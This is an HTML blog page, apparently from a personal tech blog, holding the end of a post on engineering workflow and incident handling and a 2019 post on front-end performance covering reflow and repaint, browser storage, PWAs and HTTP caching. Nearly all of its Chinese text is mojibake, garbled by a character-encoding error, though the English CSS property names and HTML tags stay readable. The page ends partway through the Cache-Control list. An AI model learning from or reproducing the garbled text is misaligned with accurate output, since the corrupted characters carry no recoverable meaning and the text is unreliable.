<h3 id="æ–¹æ¡ˆè®¾è®¡"><a href="#æ–¹æ¡ˆè®¾è®¡" class="headerlink" title="æ–¹æ¡ˆè®¾è®¡"></a>æ–¹æ¡ˆè®¾è®¡</h3><p>æ–¹æ¡ˆè®¾è®¡æœ‰å¤šé¦™ï¼Œä½“éªŒè¿‡çš„äººéƒ½çŸ¥é“ã€‚å®ƒçš„å¥½å¤„åœ¨äºå…¨å±€çš„æ€è€ƒéœ€æ±‚ï¼Œæ¯”è¾ƒå®¹æ˜“ç»™å‡ºå…¨å±€æœ€ä¼˜ï¼Œè€Œä¸ä»…ä»…æ˜¯å±€éƒ¨æœ€ä¼˜ã€‚æ–¹æ¡ˆè®¾è®¡ä¸ä»…åœ¨å¼€å‘é˜¶æ®µèµ·ç€ä¸¾è¶³è½»é‡çš„ä½œç”¨ï¼Œè¿˜å¯¹åç»­ç»´æŠ¤æœ‰å¾ˆå¤§çš„ä¾¿åˆ©ã€‚æ–¹æ¡ˆè®¾è®¡å¯ä»¥å›´ç»•è¿™å‡ ç‚¹å†™ï¼š</p>
<ul>
<li>æ—¶é—´äººç‰©ï¼šæ ‡æ³¨éœ€æ±‚å…³é”®çš„æ—¶é—´èŠ‚ç‚¹å’Œå‚ä¸æ–¹</li>
<li>ä¸šå†…æ–¹æ¡ˆï¼šä¾‹å¦‚ä¸šå†…å®ç°å’Œç«å“åˆ†æç­‰</li>
<li>æ–¹æ¡ˆè®¾è®¡ï¼šæ–¹æ¡ˆçš„å…·ä½“é€»è¾‘ï¼ŒåŒ…æ‹¬è®¾è®¡ç¨¿ã€æµç¨‹å›¾ã€åº“è¡¨å­—æ®µç­‰</li>
<li>å…¶ä»–ï¼šæµç¨‹å¡ç‚¹ã€è‡ªæˆ‘åæ€æˆ–ç»“è®ºç•™åº•ç­‰<h3 id="å¤„ç†-bug-çš„è§„çŸ©"><a href="#å¤„ç†-bug-çš„è§„çŸ©" class="headerlink" title="å¤„ç† bug çš„è§„çŸ©"></a>å¤„ç† bug çš„è§„çŸ©</h3>äº§å“æ˜¯å¼€å‘çš„ä¸Šæ¸¸ï¼Œæµ‹è¯•æ˜¯å¼€å‘çš„ä¸‹æ¸¸ã€‚æµ‹è¯•åŒå­¦å¯¹äº§å“å½¢æ€çš„è¡¨ç°ç”šè‡³æ¯”äº§å“è¿˜æ›´å…³å¿ƒï¼Œå¤šå’Œæµ‹è¯•åŒå­¦æ²Ÿé€šï¼Œä¹Ÿèƒ½è®©äº§å“æœ‰æ›´è‰¯å¥½çš„å‘å±•ã€‚è¦å’Œæµ‹è¯•åšæœ‹å‹ï¼Œä»æ¥ä¸€æ¯å¥¶èŒ¶åšèµ·ã€‚å½“ç„¶ç«‹å¥½è§„çŸ©ä¹Ÿèƒ½é¿å…åœ¨éœ€æ±‚æµ‹è¯•è¿‡ç¨‹ä¸­å¢åŠ æ²Ÿé€šæˆæœ¬ã€‚</li>
<li>æå•å‰ï¼šå…ˆæ²Ÿé€šåˆ°åº•æ˜¯å¼€å‘åŸå› è¿˜æ˜¯å…¶ä»–åŸå› ï¼Œå®šå¥½è´£ä»»æ–¹ä¸ä¼˜å…ˆçº§</li>
<li>æå•æ—¶ï¼šå¿…é¡»åŒ…å«å¤ç°è·¯å¾„åŠæˆªå›¾ï¼Œæœ€å¥½åŒ…å«è´¦å·ä¿¡æ¯å’Œå½•å±</li>
<li>æå•åï¼šéå¿…è¦åœºæ™¯æ²Ÿé€šèƒ½å¦é™ä½ä¼˜å…ˆçº§ï¼Œä¸å¥½è§£å†³çš„é—®é¢˜èƒ½å¦è½¬æˆéœ€æ±‚å•<h3 id="å‘å¸ƒæ¡ä¾‹"><a href="#å‘å¸ƒæ¡ä¾‹" class="headerlink" title="å‘å¸ƒæ¡ä¾‹"></a>å‘å¸ƒæ¡ä¾‹</h3>æµç¨‹çš„å»ºç«‹å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å¯¹äººçš„ä¿æŠ¤ï¼Œéµå¾ªæµç¨‹èƒ½æœ‰æ•ˆç¨‹åº¦ä¸Šä¿æŠ¤è‡ªå·±ã€‚</li>
<li>å‘å¸ƒè®¡åˆ’ï¼šåˆ—å¥½å‘å¸ƒè®¡åˆ’ï¼Œä» MRã€ä»£ç åˆ°é…ç½®ï¼Œä½¿ç”¨å‘å¸ƒæ ‡è®°è®°å½•æ¯ä¸ªå‘å¸ƒæ—¶é—´ç‚¹</li>
<li>å‘å¸ƒé€æ˜ï¼šéœ€è¦å‘çš„åŠŸèƒ½ã€bugfixå’Œå‹æµ‹æ¥å£æ˜ç¡®çŸ¥ä¼š</li>
<li>åšå¥½ç°åº¦ï¼šå‘å¸ƒçš„åŠŸèƒ½éµå¾ªä¸€å®šè§„åˆ™ç°åº¦</li>
<li>ç«‹åˆ»éªŒè¯ï¼šå‘å¸ƒåçš„ç¬¬ä¸€æ—¶é—´çº¿ä¸ŠéªŒè¯ï¼Œä¿è¯å‘å¸ƒåŠŸèƒ½æ­£å¸¸</li>
<li>ç•™å®ˆä¿éšœï¼šç•™å®ˆä¸€å®šçš„æ—¶é—´ï¼Œä¿è¯å‘å¸ƒåæ— æ˜æ˜¾æ³¢åŠ¨ï¼Œæ–¹ä¾¿æœ‰é—®é¢˜åŠæ—¶å“åº”<br>æ ¸å¿ƒæ€æƒ³: è§„çŸ©</li>
</ul>
<h2 id="äº‹æ•…ä¸å¤ç›˜"><a href="#äº‹æ•…ä¸å¤ç›˜" class="headerlink" title="äº‹æ•…ä¸å¤ç›˜"></a>äº‹æ•…ä¸å¤ç›˜</h2><p>åœ¨éœ€æ±‚å‘å¸ƒè¿‡ç¨‹ä¸­ï¼Œäº‹æ•…éš¾å…ä¼šå‘ç”Ÿã€‚åŠæ—¶ã€æ­£ç¡®çš„å¤„ç†äº‹æ•…ï¼Œåœ¨èŒåœºä¸Šæ˜¯å¯¹è‡ªå·±çš„ä¿æŠ¤ã€‚åŒæ ·èƒ½å¸®åŠ©è‡ªå·±æ›´å¿«çš„æˆé•¿ï¼Œå‡å°‘ç›¸åŒé”™è¯¯çš„å‘ç”Ÿã€‚</p>
<h3 id="é€æ˜åŸåˆ™"><a href="#é€æ˜åŸåˆ™" class="headerlink" title="é€æ˜åŸåˆ™"></a>é€æ˜åŸåˆ™</h3><p>äº‹æ•…å‘ç”Ÿåç¬¬ä¸€æ—¶é—´å‘ä¸Šçº§æ±‡æŠ¥ï¼Œå¹¶å®šæ—¶æ±‡æŠ¥è¿›åº¦ï¼Œå³ä¾¿æ˜¯è‡ªå·±é—¯å‡ºæ¥çš„ã€‚é‡åˆ°äº‹æ•…å»ºè®®å¤„ç†æ–¹å¼ï¼š</p>
<ul>
<li>äº‹æ•…å‘ç”Ÿæ—¶ï¼š<br>1ã€å¤§ç¾¤é‡Œè‰¾ç‰¹ç›¸å…³åŒå­¦åŠä¸Šçº§ï¼Œå¹¶åŒæ—¶ç”µè¯ä¸Šçº§ï¼Œç¡®è®¤ä¿¡æ¯åŒæ­¥å®Œå…¨<br>2ã€èƒ½æ¢å¤ç«‹åˆ»æ¢å¤<br>3ã€æ¯éš”å‡ åˆ†é’Ÿå‘ä¸Šæ±‡æŠ¥ï¼Œå³ä½¿æ²¡æœ‰è¿›åº¦<br>4ã€å‘ä¸Šçº§å¯»æ±‚å¸®åŠ©ï¼Œç›´åˆ°é—®é¢˜è§£å†³</li>
<li>äº‹æ•…å‘ç”Ÿåï¼šåæ€ä¸æ²‰æ·€</li>
</ul>
<h3 id="å¤„ç†äº‹æ•…çš„äº”è¦ç´ "><a href="#å¤„ç†äº‹æ•…çš„äº”è¦ç´ " class="headerlink" title="å¤„ç†äº‹æ•…çš„äº”è¦ç´ "></a>å¤„ç†äº‹æ•…çš„äº”è¦ç´ </h3><ul>
<li>å®šä¹‰é—®é¢˜ï¼šèƒ½ä¸èƒ½é‡åŒ–æŒ‡æ ‡ï¼Œæ¯”å¦‚å‡ºç°è·¯å¾„ã€æŒ‡æ ‡æ•°æ®ç¯</li>
<li>å‘ç°é—®é¢˜ï¼šèƒ½ä¸èƒ½æœ‰ç›‘æ§ï¼ŒåŠæ—¶å’Œå‡†ç¡®çš„å‘Šè­¦</li>
<li>åˆ†æé—®é¢˜ï¼šèƒ½ä¸èƒ½æœ‰å·¥å…·è¾…åŠ©ï¼Œæå‡åˆ†æé—®é¢˜çš„æ•ˆç‡</li>
<li>è§£å†³é—®é¢˜ï¼šèƒ½ä¸èƒ½ç¬¬ä¸€æ—¶é—´ä¿®å¤ï¼Œä¸ºç”¨æˆ·è§£å†³é—®é¢˜</li>
<li>é¢„é˜²é—®é¢˜ï¼šèƒ½ä¸èƒ½è¡¥å……ç›¸å…³caseï¼Œä¿è¯çŠ¯è¿‡çš„é”™è¯¯ä¸å†çŠ¯</li>
</ul>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>å†™åˆ°è¿™é‡ŒåŸºæœ¬å®Œæˆäº†ï¼Œæ¯ä¸ªç‚¹ç¬”è€…éƒ½äº²èº«ç»å†è¿‡ä¹Ÿå®è·µè¿‡ã€‚ä»â€œå¹´è½»â€åˆ°â€œè€â€ç¨‹åºå‘˜ï¼Œç£¨å¹³äº†å¾ˆå¤šå†²åŠ¨ä¸è½æ’ï¼Œæ²‰æ·€äº†å„ä¸ªæµç¨‹çš„â€œæœ€ä½³å®è·µâ€ã€‚å¦‚ä»Šå¸¦å°æœ‹å‹ä¸€èµ·å¹²æ´»ï¼Œå¯¹æˆ‘è€Œè¨€ï¼Œä¹Ÿæ˜¯ä¸ªå…¨æ–°çš„é˜¶æ®µã€‚è¿™ç¯‡æ–‡ç« ä¹Ÿç®—ä¸ºä¸Šé˜¶æ®µçš„æ€è€ƒåšæ²‰æ·€å§ï¼Œä¹Ÿå¸Œæœ›å¸®åŠ©åˆ°æœ‰éœ€è¦çš„äººã€‚<br>æ„Ÿè°¢ä½ é˜…è¯»åˆ°è¿™é‡Œã€‚</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/å‰ç«¯/font-end-optimize/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/å‰ç«¯/font-end-optimize/" itemprop="url">å‰ç«¯æ€§èƒ½ä¼˜åŒ–</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-05-11T23:46:04+08:00">
                2019-05-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="èµ„æºåˆå¹¶ä¸å‹ç¼©-httpè¯·æ±‚çš„è¿‡ç¨‹åŠæ½œåœ¨çš„æ€§èƒ½ä¼˜åŒ–"><a href="#èµ„æºåˆå¹¶ä¸å‹ç¼©-httpè¯·æ±‚çš„è¿‡ç¨‹åŠæ½œåœ¨çš„æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="èµ„æºåˆå¹¶ä¸å‹ç¼©-httpè¯·æ±‚çš„è¿‡ç¨‹åŠæ½œåœ¨çš„æ€§èƒ½ä¼˜åŒ–"></a>èµ„æºåˆå¹¶ä¸å‹ç¼©-httpè¯·æ±‚çš„è¿‡ç¨‹åŠæ½œåœ¨çš„æ€§èƒ½ä¼˜åŒ–</h3><p>æµè§ˆå™¨çš„ä¸€ä¸ªè¯·æ±‚ä»å‘é€åˆ°è¿”å›éƒ½ç»å†äº†ä»€ä¹ˆ</p>
<p><img src="/å‰ç«¯/font-end-optimize/./page-process.png" alt="http"></p>
<p>æ€è€ƒ</p>
<ul>
<li>dnsæ˜¯å¦å¯ä»¥é€šè¿‡ç¼“å­˜å‡å°‘dnsæŸ¥è¯¢æ—¶é—´ï¼Ÿ</li>
<li>ç½‘ç»œè¯·æ±‚çš„è¿‡ç¨‹èµ°æœ€è¿‘çš„ç½‘ç»œç¯å¢ƒï¼Ÿ</li>
<li>ç›¸åŒçš„é™æ€èµ„æºæ˜¯å¦å¯ä»¥ç¼“å­˜ï¼Ÿ</li>
<li>èƒ½å¦å‡å°‘è¯·æ±‚httpè¯·æ±‚å¤§å°ï¼Ÿ</li>
<li>å‡å°‘httpè¯·æ±‚</li>
<li>æœåŠ¡ç«¯æ¸²æŸ“<h2 id="é‡ç»˜å’Œå›æµ"><a href="#é‡ç»˜å’Œå›æµ" class="headerlink" title="é‡ç»˜å’Œå›æµ"></a>é‡ç»˜å’Œå›æµ</h2><h3 id="cssä¼šè®©JavaScriptå˜æ…¢å—"><a href="#cssä¼šè®©JavaScriptå˜æ…¢å—" class="headerlink" title="cssä¼šè®©JavaScriptå˜æ…¢å—"></a>cssä¼šè®©JavaScriptå˜æ…¢å—</h3>ä¸€ä¸ªçº¿ç¨‹æ‰§è¡ŒJavaScript<br>ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œæ¸²æŸ“<br>é¢‘ç¹è§¦å‘é‡ç»˜å’Œå›æµï¼Œå¯¼è‡´UIæ¸²æŸ“é¢‘ç¹ï¼Œæœ€é‡å¯¼è‡´jså˜æ…¢<h3 id="å•¥æ˜¯é‡ç»˜å’Œå›æµ"><a href="#å•¥æ˜¯é‡ç»˜å’Œå›æµ" class="headerlink" title="å•¥æ˜¯é‡ç»˜å’Œå›æµ"></a>å•¥æ˜¯é‡ç»˜å’Œå›æµ</h3><h4 id="å›æµ"><a href="#å›æµ" class="headerlink" title="å›æµ"></a>å›æµ</h4></li>
<li>å½“render treeä¸­çš„ä¸€éƒ¨åˆ†æˆ–å…¨éƒ¨å› ä¸ºå…ƒç´ è§„æ¨¡å°ºå¯¸ï¼Œå¸ƒå±€ï¼Œéšè—ç­‰æ”¹å˜éœ€è¦é‡æ–°æ„å»ºï¼Œç§°ä½œä¸ºå›æµï¼ˆreflowï¼‰</li>
<li>å½“é¡µé¢å¸ƒå±€å’Œå‡ ä½•å±æ€§å˜åŒ–æ—¶ï¼Œå°±éœ€è¦å›æµ<h4 id="é‡ç»˜"><a href="#é‡ç»˜" class="headerlink" title="é‡ç»˜"></a>é‡ç»˜</h4>å½“render treeä¸­çš„ä¸€äº›å…ƒç´ éœ€è¦æ›´æ–°å±æ€§ï¼Œè€Œè¿™äº›å±æ€§åªæ˜¯å½±å“å…ƒç´ å¤–è§‚ï¼Œé£æ ¼ï¼Œè€Œä¸ä¼šå½±å“å¸ƒå±€çš„ï¼Œæ¯”å¦‚background-colorï¼Œåˆ™ç§°ä¹‹ä¸ºé‡ç»˜</li>
</ul>
<p>å›æµä¸€å®šä¼šé‡ç»˜ï¼Œé‡ç»˜ä¸ä¸€å®šä¼šå›æµ</p>
<h3 id="è§¦å‘é¡µé¢é‡å¸ƒå±€çš„å±æ€§"><a href="#è§¦å‘é¡µé¢é‡å¸ƒå±€çš„å±æ€§" class="headerlink" title="è§¦å‘é¡µé¢é‡å¸ƒå±€çš„å±æ€§"></a>è§¦å‘é¡µé¢é‡å¸ƒå±€çš„å±æ€§</h3><ul>
<li>ç›’å­æ¨¡å‹ç›¸å…³å±æ€§ä¼šè§¦å‘é‡å¸ƒå±€</li>
<li>å®šä½å±æ€§åŠæµ®åŠ¨ä¼šè§¦å‘é¡µé¢é‡å¸ƒå±€</li>
<li>æ”¹å˜èŠ‚ç‚¹å†…éƒ¨æ–‡å­—ç»“æ„ä¼šè§¦å‘é‡å¸ƒå±€<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">width			top			text-align</span><br><span class="line">height			bottom		overflow-y</span><br><span class="line">padding			left		font-weight</span><br><span class="line">margin			right		overflow</span><br><span class="line">display			position	font-family</span><br><span class="line">border-width	float		line-height</span><br><span class="line">border			clear		vertical-align</span><br><span class="line">min-height					white-space</span><br><span class="line">							font-size</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="è§¦å‘é¡µé¢é‡ç»˜çš„å±æ€§"><a href="#è§¦å‘é¡µé¢é‡ç»˜çš„å±æ€§" class="headerlink" title="è§¦å‘é¡µé¢é‡ç»˜çš„å±æ€§"></a>è§¦å‘é¡µé¢é‡ç»˜çš„å±æ€§</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">color				border-style</span><br><span class="line">border-radius		visibility</span><br><span class="line">text-decoration		background</span><br><span class="line">background-image	background-position</span><br><span class="line">background-repeat	background-size</span><br><span class="line">outline-color		outline</span><br><span class="line">outline-style		outline-width</span><br><span class="line">box-shadow</span><br></pre></td></tr></table></figure>
<h3 id="æ–°å»ºDOMè¿‡ç¨‹"><a href="#æ–°å»ºDOMè¿‡ç¨‹" class="headerlink" title="æ–°å»ºDOMè¿‡ç¨‹"></a>æ–°å»ºDOMè¿‡ç¨‹</h3><p>1ã€ è·å–DOMååˆ†å‰²ä¸ºå¤šä¸ªå›¾å±‚<br>2ã€ å¯¹æ¯ä¸ªå›¾å±‚çš„é˜¶æ®µè®¡ç®—æ ·å¼ç»“æœ(recalulate style â€” æ ·å¼é‡è®¡ç®—)<br>3ã€ ä¸ºæ¯ä¸ªèŠ‚ç‚¹ç”Ÿæˆå›¾å½¢å’Œä½ç½®(Layoutâ€” å›æµå’Œé‡å¸ƒå±€)<br>4ã€ å°†æ¯ä¸ªèŠ‚ç‚¹ç»˜åˆ¶å¡«å……åˆ°å›¾å±‚ä½ç½®ä¸­(Paint setup å’ŒPaint â€” é‡ç»˜)<br>5ã€ å›¾å±‚ä½œä¸ºçº¹ç†ä¸Šä¼ è‡³gpu<br>6ã€ ç¬¦åˆå¤šä¸ªå›¾å±‚åˆ°é¡µé¢ä¸Šç”Ÿæˆæœ€ç»ˆå±å¹•å›¾åƒ(composite layers â€” å›¾å±‚é‡ç»„)</p>
<h3 id="å‡å°‘é‡ç»˜å’Œå›æµ"><a href="#å‡å°‘é‡ç»˜å’Œå›æµ" class="headerlink" title="å‡å°‘é‡ç»˜å’Œå›æµ"></a>å‡å°‘é‡ç»˜å’Œå›æµ</h3><p>é¿å…é‡ç»˜å›æµçš„css<br>å°†é¢‘ç¹é‡ç»˜å’Œå›æµçš„domå…ƒç´ å•ç‹¬ä½œä¸ºç‹¬ç«‹å›¾å±‚ï¼Œé‚£ä¹ˆè¿™ä¸ªdomå…ƒç´ åªä¼šå½±å“è¿™ä¸ªç‹¬ç«‹å›¾å±‚</p>
<h3 id="å¦‚ä½•å°†DOMåˆ›å»ºä¸€ä¸ªæ–°çš„å›¾å±‚"><a href="#å¦‚ä½•å°†DOMåˆ›å»ºä¸€ä¸ªæ–°çš„å›¾å±‚" class="headerlink" title="å¦‚ä½•å°†DOMåˆ›å»ºä¸€ä¸ªæ–°çš„å›¾å±‚"></a>å¦‚ä½•å°†DOMåˆ›å»ºä¸€ä¸ªæ–°çš„å›¾å±‚</h3><p>1ã€3Dæˆ–è€…é€è§†å˜åŒ–CSSå±æ€§(perspective transform)<br>2ã€ ä½¿ç”¨åŠ é€Ÿè§†å±è§£ç çš„ video èŠ‚ç‚¹<br>3ã€æ‹¥æœ‰3D(webGL)ä¸Šä¸‹æ–‡æˆ–åŠ é€Ÿçš„2Dä¸Šä¸‹æ–‡çš„ canvas èŠ‚ç‚¹<br>4ã€æ··åˆæ’ä»¶(å¦‚flash)<br>5ã€å¯¹è‡ªå·±çš„opacityåšcssåŠ¨ç”»æˆ–ä½¿ç”¨ä¸€ä¸ªåŠ¨ç”»webkitå˜æ¢çš„å…ƒç´ <br>6ã€ä½¿ç”¨åŠ é€ŸCSSè¿‡æ»¤å™¨çš„å…ƒç´ (translate3D..)<br>7ã€å…ƒç´ æœ‰ä¸€ä¸ªåŒ…å«å¤åˆå±‚çš„åä»£èŠ‚ç‚¹(ä¸€ä¸ªå…ƒç´ æ‹¥æœ‰ä¸€ä¸ªå­å…ƒç´ ï¼Œè¯¥å…ƒç´ åœ¨è‡ªå·±çš„å±‚é‡Œ)<br>8ã€å…ƒç´ æœ‰ä¸€ä¸ªz-indexè¾ƒä½ä¸”åŒ…å«ä¸€ä¸ªç¬¦åˆå±‚çš„å…„å¼Ÿå…ƒç´ (è¯¥å…ƒæ¸²æŸ“åœ¨ç¬¦åˆå±‚ä¸Šé¢æ¸²æŸ“)</p>
<h3 id="é¿å…é‡ç»˜å›æµ"><a href="#é¿å…é‡ç»˜å›æµ" class="headerlink" title="é¿å…é‡ç»˜å›æµ"></a>é¿å…é‡ç»˜å›æµ</h3><p>1ã€ç”¨translateæ›¿ä»£topï¼štopä¼šè§¦å‘å›æµè€Œtranslateä¸ä¼š<br>2ã€ç”¨opacityæ›¿ä»£visibilityï¼švisibilityä¼šè§¦å‘é‡ç»˜è€Œopacityä¸ä¼š<br>3ã€ä¸è¦ä¸€æ¡æ¡ä¿®æ”¹DOMä¿®æ”¹æ ·å¼ï¼Œå¯ä»¥æ”¾åœ¨ä¸€ä¸ªclasså†…ï¼Œæ›¿æ¢class<br>4ã€ç¦»çº¿ä¿®æ”¹ï¼Œä½¿ç”¨display-noneä¿®æ”¹å…ƒç´ å†æ˜¾ç¤º<br>5ã€ä¸è¦æŠŠDOMèŠ‚ç‚¹å±æ€§å€¼æ”¾åœ¨ä¸€ä¸ªå¾ªç¯é‡Œçš„å˜é‡é‡Œï¼ˆoffsetHightï¼Œ offsetWidthï¼‰<br>6ã€ä¸ä½¿ç”¨tableå¸ƒå±€ï¼Œå¯èƒ½å¾ˆå°çš„ä¿®æ”¹å¯¼è‡´æ•´ä¸ªtableé‡æ–°å¸ƒå±€<br>7ã€åŠ¨ç”»å®ç°çš„é€Ÿåº¦çš„é€‰æ‹©<br>8ã€å¯¹äºåŠ¨ç”»æ–°å»ºå›¾å±‚ (gitå›¾åŠ ä¸Šwill-change, transform)<br>9ã€ä½¿ç”¨GPUç¡¬ä»¶åŠ é€Ÿ(trasform: translateZ, trasform: transform3d(0,0,0))</p>
<h2 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h2><ul>
<li>HTML5è®¾è®¡å‡ºæ¥ä¸“é—¨ç”¨äºæµè§ˆå™¨å­˜å‚¨çš„</li>
<li>å¤§å°ä¸º5Må·¦å³</li>
<li>å°½åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œä¸å’ŒæœåŠ¡ç«¯é€šä¿¡</li>
<li>æ¥å£å°è£…æ¯”è¾ƒå¥½</li>
<li>æµè§ˆå™¨æœ¬åœ°ç¼“å­˜æ–¹æ¡ˆ</li>
</ul>
<h2 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h2><ul>
<li>ä¼šè¯çº§åˆ«çš„æµè§ˆå™¨å­˜å‚¨</li>
<li>å¤§å°ä¸º5Må·¦å³</li>
<li>ä»…åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œä¸å’ŒæœåŠ¡å™¨ç«¯é€šä¿¡</li>
<li>æ¥å£å°è£…è¾ƒå¥½</li>
<li>å¯¹äºè¡¨å•ä¿¡æ¯çš„ç»´æŠ¤</li>
</ul>
<h2 id="indexDB"><a href="#indexDB" class="headerlink" title="indexDB"></a>indexDB</h2><ul>
<li>IndexedDB æ˜¯ä¸€ç§ä½çº§APIï¼Œç”¨äºå®¢æˆ·ç«¯å­˜å‚¨å¤§é‡ç»“æ„åŒ–æ•°æ®(åŒ…æ‹¬, æ–‡ä»¶/ blobs)ã€‚è¯¥APIä½¿ç”¨ç´¢å¼•æ¥å®ç°å¯¹è¯¥æ•°æ®çš„é«˜æ€§èƒ½æœç´¢ã€‚è™½ç„¶ Web Storage å¯¹äºå­˜å‚¨è¾ƒå°‘é‡çš„æ•°æ®å¾ˆæœ‰ç”¨ï¼Œä½†å¯¹äºå­˜å‚¨æ›´å¤§é‡çš„ç»“æ„åŒ–æ•°æ®æ¥è¯´ï¼Œè¿™ç§æ–¹æ³•ä¸å¤ªæœ‰ç”¨ã€‚IndexedDBæä¾›äº†ä¸€ä¸ªè§£å†³æ–¹æ¡ˆã€‚</li>
<li>ä¸ºåº”ç”¨åˆ›å»ºç¦»çº¿ç‰ˆæœ¬</li>
</ul>
<h2 id="PWA"><a href="#PWA" class="headerlink" title="PWA"></a>PWA</h2><p>Progressive Web App, ç®€ç§° PWAï¼Œæ˜¯æå‡ Web App çš„ä½“éªŒçš„ä¸€ç§æ–°æ–¹æ³•ï¼Œèƒ½ç»™ç”¨æˆ·åŸç”Ÿåº”ç”¨çš„ä½“éªŒã€‚</p>
<p>PWA èƒ½åšåˆ°åŸç”Ÿåº”ç”¨çš„ä½“éªŒä¸æ˜¯é ç‰¹æŒ‡æŸä¸€é¡¹æŠ€æœ¯ï¼Œè€Œæ˜¯ç»è¿‡åº”ç”¨ä¸€äº›æ–°æŠ€æœ¯è¿›è¡Œæ”¹è¿›ï¼Œåœ¨å®‰å…¨ã€æ€§èƒ½å’Œä½“éªŒä¸‰ä¸ªæ–¹é¢éƒ½æœ‰å¾ˆå¤§æå‡ï¼ŒPWA æœ¬è´¨ä¸Šæ˜¯ Web Appï¼Œå€ŸåŠ©ä¸€äº›æ–°æŠ€æœ¯ä¹Ÿå…·å¤‡äº† Native App çš„ä¸€äº›ç‰¹æ€§ï¼Œå…¼å…· Web App å’Œ Native App çš„ä¼˜ç‚¹ã€‚</p>
<p>PWA çš„ä¸»è¦ç‰¹ç‚¹åŒ…æ‹¬ä¸‹é¢ä¸‰ç‚¹ï¼š</p>
<p>å¯é  - å³ä½¿åœ¨ä¸ç¨³å®šçš„ç½‘ç»œç¯å¢ƒä¸‹ï¼Œä¹Ÿèƒ½ç¬é—´åŠ è½½å¹¶å±•ç°<br>ä½“éªŒ - å¿«é€Ÿå“åº”ï¼Œå¹¶ä¸”æœ‰å¹³æ»‘çš„åŠ¨ç”»å“åº”ç”¨æˆ·çš„æ“ä½œ<br>ç²˜æ€§ - åƒè®¾å¤‡ä¸Šçš„åŸç”Ÿåº”ç”¨ï¼Œå…·æœ‰æ²‰æµ¸å¼çš„ç”¨æˆ·ä½“éªŒï¼Œç”¨æˆ·å¯ä»¥æ·»åŠ åˆ°æ¡Œé¢<br>PWA æœ¬èº«å¼ºè°ƒæ¸è¿›å¼ï¼Œå¹¶ä¸è¦æ±‚ä¸€æ¬¡æ€§è¾¾åˆ°å®‰å…¨ã€æ€§èƒ½å’Œä½“éªŒä¸Šçš„æ‰€æœ‰è¦æ±‚ï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡ PWA Checklist æŸ¥çœ‹ç°æœ‰çš„ç‰¹å¾ã€‚</p>
<h2 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h2><p>1ã€ä½¿ç”¨æ‹¦æˆªå’Œå¤„ç†ç½‘ç»œè¯·æ±‚èƒ½åŠ›ï¼Œå®ç°ç¦»çº¿åº”ç”¨<br>2ã€ä½¿ç”¨Service Workeråœ¨åå°è¿è¡ŒåŒæ—¶å’Œé¡µé¢é€šä¿¡çš„èƒ½åŠ›ï¼Œè¶‹åŠ¿çº¿å¤§è§„æ¨¡åå°æ•°æ®å¤„ç†</p>
<h2 id="ç¼“å­˜"><a href="#ç¼“å­˜" class="headerlink" title="ç¼“å­˜"></a>ç¼“å­˜</h2><h3 id="httpheader"><a href="#httpheader" class="headerlink" title="httpheader"></a>httpheader</h3><h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h4><ul>
<li>max-age=â€secondsâ€<br>è®¾ç½®ç¼“å­˜å­˜å‚¨çš„æœ€å¤§å‘¨æœŸï¼Œè¶…è¿‡è¿™ä¸ªæ—¶é—´ç¼“å­˜è¢«è®¤ä¸ºè¿‡æœŸ(å•ä½ç§’)ã€‚ä¸Expiresç›¸åï¼Œæ—¶é—´æ˜¯ç›¸å¯¹äºè¯·æ±‚çš„æ—¶é—´ã€‚</li>
<li>s-maxage=â€secondsâ€<br>è¦†ç›–max-age æˆ–è€… Expires å¤´ï¼Œä½†æ˜¯ä»…é€‚ç”¨äºå…±äº«ç¼“å­˜(æ¯”å¦‚å„ä¸ªä»£ç†)ï¼Œå¹¶ä¸”ç§æœ‰ç¼“å­˜ä¸­å®ƒè¢«å¿½ç•¥ã€‚</li>
<li>public<br>è¡¨æ˜å“åº”å¯ä»¥è¢«ä»»ä½•å¯¹è±¡ï¼ˆåŒ…æ‹¬ï¼šå‘é€è¯·æ±‚çš„å®¢æˆ·ç«¯ï¼Œä»£ç†æœåŠ¡å™¨ï¼Œç­‰ç­‰ï¼‰ç¼“å­˜ã€‚</li>
